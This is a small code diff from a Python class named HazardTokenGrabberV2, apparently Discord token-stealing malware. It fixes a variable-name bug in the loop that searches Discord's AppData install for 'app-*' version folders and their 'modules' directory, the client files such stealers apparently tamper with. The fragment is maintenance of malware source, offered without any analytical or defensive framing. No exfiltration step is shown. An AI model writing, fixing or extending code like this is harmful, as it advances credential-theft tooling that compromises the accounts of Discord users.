@@ -262,10 +262,10 @@ class HazardTokenGrabberV2(Functions):
             disc_dir = ntpath.abspath(self.appdata + os.sep + _dir)
 
             # find and iterate through 'app-*' directories
-            for __dir in os.listdir(discord_dir):
+            for __dir in os.listdir(disc_dir):
                 if not re.match(r'app-(\d*\.\d*)*', __dir): continue
 
-                app_dir = ntpath.join(discord_dir, __dir)
+                app_dir = ntpath.join(disc_dir, __dir)
                 modules_dir = ntpath.join(app_dir, 'modules')
 
                 # check if this app directory contains a 'modules' directory
